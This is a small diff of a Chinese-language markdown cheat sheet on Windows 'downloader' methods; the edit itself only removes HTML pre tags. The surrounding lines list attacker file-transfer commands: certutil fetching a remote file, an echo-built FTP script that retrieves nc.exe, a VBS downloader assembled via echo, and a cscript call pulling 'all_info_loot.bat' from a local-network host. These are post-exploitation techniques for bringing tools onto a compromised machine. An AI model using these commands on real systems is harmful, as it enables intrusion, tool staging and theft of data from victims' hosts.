@@ -41,17 +41,17 @@ downloader常用方法如下：
  3. certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/version.txt file.txt
 
  ftp:
-    <pre>
+    
     echo USER offs >>  ftp.txt
     echo lab >> ftp.txt
     echo bin >> ftp.txt
     echo GET nc.exe >> ftp.txt
     echo bye >> ftp.txt
-    </pre>
+    
     ftp -v -n -s:ftp.txt
 
 vbs:
-    <pre>
+ 
     echo strUrl = WScript.Arguments.Item(0) > wget.vbs
     echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
     echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
@@ -77,7 +77,7 @@ vbs:
     echo  ts.Write Chr(255 and Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
     echo  Next >> wget.vbs
     echo  ts.Close >> wget.vbs
-    </pre>
+   
 
 cscript wget.vbs http://192.168.56.1/all_info_loot.bat all_info_loot.bat
 
